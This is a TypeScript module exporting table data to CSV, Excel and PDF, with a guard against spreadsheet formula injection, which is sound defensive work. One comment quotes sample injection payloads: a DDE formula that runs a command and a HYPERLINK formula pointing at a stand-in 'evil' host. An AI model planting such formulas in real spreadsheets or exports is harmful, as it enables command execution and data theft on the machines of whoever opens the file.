import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";
import * as XLSX from "xlsx";
import { saveAs } from "file-saver";

interface ExportColumn {
  id: string;
  label: string;
}

interface ExportRow {
  [key: string]: any;
}

const sanitizeFilename = (filename: string): string => {
  return filename
    .replace(/[<>:"/\\|?*]/g, "_")
    .replace(/\.+/g, ".")
    .slice(0, 200);
};

// CSV/spreadsheet formula injection (CWE-1236): a cell value starting with
// =, +, -, @, a tab, or a carriage return is interpreted as a live formula
// by Excel/Google Sheets/LibreOffice when the file is opened — e.g.
// `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil","x")` can exfiltrate data
// or run commands on the opening machine. Exported data is frequently
// user-controlled (vendor names, free-text fields, etc.), so every cell must
// be neutralized before the existing comma/quote/newline CSV escaping runs.
// Standard mitigation: prefix a leading single quote so spreadsheet apps
// treat the cell as literal text instead of a formula.
const FORMULA_TRIGGER_RE = /^[=+\-@\t\r]/;

const sanitizeCellForFormulaInjection = (value: string): string =>
  FORMULA_TRIGGER_RE.test(value) ? `'${value}` : value;

/**
 * Export table data to CSV
 */
export const exportToCSV = (
  data: ExportRow[],
  columns: ExportColumn[],
  filename: string = "export",
) => {
  const escapeCell = (strValue: string): string => {
    const sanitized = sanitizeCellForFormulaInjection(strValue);
    // Escape quotes and wrap in quotes if contains comma, quote, or newline
    return sanitized.match(/[,"\n]/) ? `"${sanitized.replace(/"/g, '""')}"` : sanitized;
  };

  const headers = columns.map((col) => escapeCell(col.label)).join(",");
  const rows = data.map((row) =>
    columns
      .map((col) => {
        const value = row[col.id] ?? "";
        return escapeCell(String(value));
      })
      .join(","),
  );

  const csv = [headers, ...rows].join("\n");
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  saveAs(blob, `${sanitizeFilename(filename)}.csv`);
};

// aoa_to_sheet stores a string cell with its literal text (SheetJS marks
// it t:"s" — a plain string, never auto-promoted to a formula t:"f" cell),
// so genuine .xlsx binaries are not vulnerable to CSV-style formula
// injection the way plain-text CSV is. Sanitizing here anyway is
// defense-in-depth: harmless for normal values, and it protects any
// downstream flow that later round-trips this data back through a CSV
// export or a raw-text viewer. Only string cells are touched — numbers and
// booleans (e.g. 0, false) must stay as their native types.
const sanitizeExcelCell = (value: unknown): unknown =>
  typeof value === "string" ? sanitizeCellForFormulaInjection(value) : value;

/**
 * Export table data to Excel (.xlsx)
 */
export const exportToExcel = (
  data: ExportRow[],
  columns: ExportColumn[],
  filename: string = "export",
) => {
  // Create worksheet data with headers
  const wsData = [
    columns.map((col) => sanitizeExcelCell(col.label)),
    ...data.map((row) => columns.map((col) => sanitizeExcelCell(row[col.id] ?? ""))),
  ];

  const ws = XLSX.utils.aoa_to_sheet(wsData);

  // Auto-size columns
  const colWidths = columns.map((col) => {
    const maxLength = Math.max(
      col.label.length,
      ...data.map((row) => String(row[col.id] ?? "").length),
    );
    return { wch: Math.min(maxLength + 2, 50) };
  });
  ws["!cols"] = colWidths;

  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, ws, "Sheet1");

  // Write and trigger download
  XLSX.writeFile(wb, `${sanitizeFilename(filename)}.xlsx`);
};

/**
 * Export table data to PDF
 */
export const exportToPDF = (
  data: ExportRow[],
  columns: ExportColumn[],
  filename: string = "export",
  title?: string,
) => {
  try {
    const doc = new jsPDF();

    // Add title
    if (title) {
      doc.setFontSize(16);
      doc.setFont("helvetica", "bold");
      doc.text(title, 14, 15);
    }

    // Prepare table data
    const headers = columns.map((col) => col.label);
    const rows = data.map((row) => columns.map((col) => String(row[col.id] ?? "")));

    // Use autoTable function
    autoTable(doc, {
      head: [headers],
      body: rows,
      startY: title ? 25 : 10,
      styles: {
        fontSize: 8,
        cellPadding: 2,
      },
      headStyles: {
        fillColor: [66, 139, 202],
        fontStyle: "bold",
      },
      alternateRowStyles: {
        fillColor: [245, 245, 245],
      },
      margin: { top: title ? 25 : 10 },
    });

    doc.save(`${sanitizeFilename(filename)}.pdf`);
  } catch (error) {
    console.error("Error generating PDF:", error);
    alert("Failed to generate PDF. Please try again or use CSV/Excel export instead.");
  }
};

/**
 * Print table data - generates PDF and opens print dialog
 */
export const printTable = (data: ExportRow[], columns: ExportColumn[], title?: string) => {
  try {
    const doc = new jsPDF();

    // Add title
    if (title) {
      doc.setFontSize(16);
      doc.setFont("helvetica", "bold");
      doc.text(title, 14, 15);
    }

    // Prepare table data
    const headers = columns.map((col) => col.label);
    const rows = data.map((row) => columns.map((col) => String(row[col.id] ?? "")));

    // Use autoTable function
    autoTable(doc, {
      head: [headers],
      body: rows,
      startY: title ? 25 : 10,
      styles: {
        fontSize: 8,
        cellPadding: 2,
      },
      headStyles: {
        fillColor: [66, 139, 202],
        fontStyle: "bold",
      },
      alternateRowStyles: {
        fillColor: [245, 245, 245],
      },
      margin: { top: title ? 25 : 10 },
    });

    // Generate PDF as blob and open print dialog
    const pdfBlob = doc.output("blob");
    const blobUrl = URL.createObjectURL(pdfBlob);

    // Open in new window and trigger print
    const printWindow = window.open(blobUrl, "_blank");
    if (printWindow) {
      printWindow.onload = () => {
        printWindow.print();
      };
      printWindow.onafterprint = () => URL.revokeObjectURL(blobUrl);
      // Fallback cleanup after timeout
      setTimeout(() => URL.revokeObjectURL(blobUrl), 60000);
    } else {
      URL.revokeObjectURL(blobUrl);
      alert("Please allow popups to print the table.");
    }
  } catch (error) {
    console.error("Error generating print preview:", error);
    alert("Failed to generate print preview. Please try exporting to PDF instead.");
  }
};
